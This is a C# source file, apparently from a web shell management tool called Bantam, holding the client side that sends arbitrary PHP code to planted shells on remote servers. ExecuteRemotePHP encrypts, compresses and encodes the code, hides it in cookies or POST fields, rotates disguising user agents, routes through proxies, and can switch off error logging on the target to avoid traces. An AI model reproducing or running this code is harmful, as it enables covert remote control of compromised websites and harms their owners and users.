using System;
using System.Web;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;
using System.Net;
using SocksSharp;
using SocksSharp.Proxy;
using System.Text;
using System.IO;
using System.IO.Compression;

namespace bantam.Classes
{
    static class WebHelper
    {
        /// <summary>
        /// todo replace this useragent into a defaults config of sorts
        /// </summary>
        public static string g_CurrentUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0";

        /// <summary>
        /// 
        /// </summary>
        public static readonly Dictionary<int, string> commonUseragents = new Dictionary<int, string> {
            {0, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36"},
            {1, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" },
            {2, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" },
            {3, "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" },
            {4, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0" },
            {5, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134" },
            {6, "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" },
            {7, "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"},
            {8, "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36" },
            {9, "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36" },
            {10, "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01" },
            {11, "Mozilla/5.0 (iPhone; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543a Safari/419.3" },
            {12, "Mozilla/5.0 (PlayStation 4 1.70) AppleWebKit/536.26 (KHTML, like Gecko)" }
        };

        /// <summary>
        /// 
        /// </summary>
        /// 
        private static HttpClient client = new HttpClient(new HttpClientHandler {
            UseCookies = false,
        });

        /// <summary>
        /// 
        /// </summary>
        public static void ResetHttpClient()
        {
            client.CancelPendingRequests();
            client.Dispose();

            client = new HttpClient(new HttpClientHandler {
                UseCookies = false,
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="proxyUrl"></param>
        /// <param name="proxyPort"></param>
        public static void AddHttpProxy(string proxyUrl, string proxyPort)
        {
            client.CancelPendingRequests();
            client.Dispose();

            client = new HttpClient(new HttpClientHandler {
                UseProxy = true,
                UseCookies = false,
                Proxy = new WebProxy(proxyUrl + ":" + proxyPort, false)
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="proxyUrl"></param>
        /// <param name="proxyPort"></param>
        public static void AddSocksProxy(string proxyUrl, int proxyPort)
        {
            client.CancelPendingRequests();
            client.Dispose();

            var settings = new ProxySettings {
                Host = proxyUrl,
                Port = proxyPort
            };

            var proxyClientHandler = new ProxyClientHandler<Socks5>(settings);
            client = new HttpClient(proxyClientHandler);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="input"></param>
        /// <param name="removeHeader"></param>
        /// <returns></returns>
        public static byte[] GzCompress(byte[] input, bool removeHeader = true)
        {
            using (var result = new MemoryStream()) {
                var lengthBytes = BitConverter.GetBytes(input.Length);
                result.Write(lengthBytes, 0, 4);

                using (var compressionStream = new GZipStream(result, CompressionMode.Compress)) {
                    compressionStream.Write(input, 0, input.Length);
                    compressionStream.Flush();
                }

                Byte[] compressedBytes = result.ToArray();

                if (removeHeader) {
                    int headerSize = 14;

                    Byte[] bytesWithoutHeader = new Byte[compressedBytes.Length - headerSize];
                    Buffer.BlockCopy(compressedBytes, headerSize, bytesWithoutHeader, 0, bytesWithoutHeader.Length);

                    return bytesWithoutHeader;
                } else {
                    return compressedBytes;
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="url"></param>
        /// <returns></returns>
        public static async Task<string> GetRequest(string url)
        {
            try {
                HttpMethod method = HttpMethod.Get;

                var request = new HttpRequestMessage(method, url);
                request.Headers.TryAddWithoutValidation("User-Agent", g_CurrentUserAgent);

                var response       = await client.SendAsync(request);
                var responseString = await response.Content.ReadAsStringAsync();

                return responseString;
            } catch (System.Net.Http.HttpRequestException) {
                //todo level 3 logging
            }
            return string.Empty;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="url"></param>
        /// <returns></returns>
        public static async Task<string> PostRequest(string url, Dictionary<string, string> values)
        {
            try {
                HttpMethod method = HttpMethod.Post;

                var request = new HttpRequestMessage(method, url);
                request.Headers.TryAddWithoutValidation("User-Agent", g_CurrentUserAgent);

                var response = await client.SendAsync(request);
                var responseString = await response.Content.ReadAsStringAsync();

                var content = new FormUrlEncodedContent(values);
                request.Content = content;

                return responseString;
            } catch (System.Net.Http.HttpRequestException) {
                //todo level 3 logging
            }
            return string.Empty;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="url"></param>
        /// <param name="phpCode"></param>
        /// <returns></returns>
        public static async Task<ResponseObject> ExecuteRemotePHP(string url, string phpCodeIn)
        {
            bool b64Encoded = false;
            string ResponseEncryptionKey = string.Empty,
                   ResponseEncryptionIV = string.Empty,
                   requestEncryptionIV_VarName = string.Empty,
                   requestEncryptionIV = string.Empty;

            bool sendViaCookie = BantamMain.Shells[url].SendDataViaCookie;
            bool gzipRequestData = BantamMain.Shells[url].GzipRequestData;
            bool encryptResponse = BantamMain.Shells[url].ResponseEncryption;

            int ResponseEncryptionMode = BantamMain.Shells[url].ResponseEncryptionMode;

            string requestArgsName = BantamMain.Shells[url].RequestArgName;

            bool encryptRequest = BantamMain.Shells[url].RequestEncryption;
            bool sendRequestEncryptionIV = BantamMain.Shells[url].SendRequestEncryptionIV;

            string phpCode = phpCodeIn;

            if (string.IsNullOrEmpty(phpCode)) {
                //todo level 3 logging
                return new ResponseObject(string.Empty, string.Empty, string.Empty);
            }

            try {
                HttpMethod method;

                if (sendViaCookie) {
                    method = HttpMethod.Get;
                } else {
                    method = HttpMethod.Post;
                }

                var request = new HttpRequestMessage(method, url);
                request.Headers.TryAddWithoutValidation("User-Agent", g_CurrentUserAgent);

                if (encryptResponse) {
                    phpCode += PhpBuilder.EncryptPhpVariableAndEcho(ResponseEncryptionMode, ref ResponseEncryptionKey, ref ResponseEncryptionIV);
                }

                if (Config.DisableErrorLogs) {
                    phpCode = PhpBuilder.DisableErrorLogging() + phpCode;
                }

                if (Config.MaxExecutionTime) {
                    phpCode = PhpBuilder.MaxExecutionTime() + phpCode;
                }

                phpCode = Helper.MinifyCode(phpCode);

                //todo cleanup / minimize and refactor this shit
                if (gzipRequestData) {
                    byte[] phpCodeBytes = Encoding.UTF8.GetBytes(phpCode);
                    phpCodeBytes = GzCompress(phpCodeBytes);

                    if (encryptRequest) {
                        string encryptionKey = BantamMain.Shells[url].RequestEncryptionKey;

                        if (sendRequestEncryptionIV) {
                            requestEncryptionIV = EncryptionHelper.GetRandomEncryptionIV();
                            requestEncryptionIV_VarName = BantamMain.Shells[url].RequestEncryptionIVRequestVarName;

                            phpCode = EncryptionHelper.EncryptBytesToRJ256ToBase64(phpCodeBytes, encryptionKey, requestEncryptionIV);
                            b64Encoded = true;
                        } else {
                            string encryptionIV = BantamMain.Shells[url].RequestEncryptionIV;

                            phpCode = EncryptionHelper.EncryptBytesToRJ256ToBase64(phpCodeBytes, encryptionKey, encryptionIV);
                            b64Encoded = true;
                        }
                    } else {
                        phpCode = Convert.ToBase64String(phpCodeBytes);
                        b64Encoded = true;
                    }
                } else {
                    if (encryptRequest) {
                        string encryptionKey = BantamMain.Shells[url].RequestEncryptionKey;

                        if (sendRequestEncryptionIV) {
                            requestEncryptionIV = EncryptionHelper.GetRandomEncryptionIV();
                            requestEncryptionIV_VarName = BantamMain.Shells[url].RequestEncryptionIVRequestVarName;

                            phpCode = EncryptionHelper.EncryptBytesToRJ256ToBase64(Encoding.UTF8.GetBytes(phpCode), encryptionKey, requestEncryptionIV);
                            b64Encoded = true;
                        } else {
                            string encryptionIV = BantamMain.Shells[url].RequestEncryptionIV;

                            phpCode = EncryptionHelper.EncryptBytesToRJ256ToBase64(Encoding.UTF8.GetBytes(phpCode), encryptionKey, encryptionIV);
                            b64Encoded = true;
                        }
                    }
                }

                if (!b64Encoded) {
                    phpCode = Helper.EncodeBase64ToString(phpCode);
                }

                phpCode = HttpUtility.UrlEncode(phpCode);

                if (sendViaCookie) {
                    if (phpCode.Length > Config.MaxCookieSizeB) {
                        //todo global logging
                        return new ResponseObject(string.Empty, string.Empty, string.Empty);
                    }

                    request.Headers.TryAddWithoutValidation("Cookie", requestArgsName + "=" + phpCode);

                    if (encryptRequest && sendRequestEncryptionIV) {
                        request.Headers.TryAddWithoutValidation("Cookie,", requestEncryptionIV_VarName + "=" + HttpUtility.UrlEncode(requestEncryptionIV));
                    }
                    phpCode = null;
                } else {
                    string postArgs = string.Empty;
                    if (encryptRequest && sendRequestEncryptionIV) {
                        postArgs = string.Format(requestArgsName + "={0}&{1}={2}", phpCode, requestEncryptionIV_VarName, HttpUtility.UrlEncode(requestEncryptionIV));
                    } else {
                        postArgs = string.Format(requestArgsName + "={0}", phpCode);
                    }

                    int maxPostSizeBytes = (Config.MaxPostSizeKib * 1000);
                    if (postArgs.Length > maxPostSizeBytes) {
                        //todo global logging
                        return new ResponseObject(string.Empty, string.Empty, string.Empty);
                    }

                    request.Content = new StringContent(postArgs, Encoding.UTF8, "application/x-www-form-urlencoded");

                    phpCode = null;
                    postArgs = null;
                }

                using (HttpResponseMessage response = await client.SendAsync(request, HttpCompletionOption.ResponseHeadersRead)) {
                    var responseString = await response.Content.ReadAsStringAsync();

                    return new ResponseObject(responseString, ResponseEncryptionKey, ResponseEncryptionIV);
                }
            } catch (System.Net.Http.HttpRequestException e) {
                //todo level 2/3 logging
            } catch (Exception e) {
                //todo level 2/3 logging
            }
            return new ResponseObject(string.Empty, string.Empty, string.Empty);
        }
    }
}
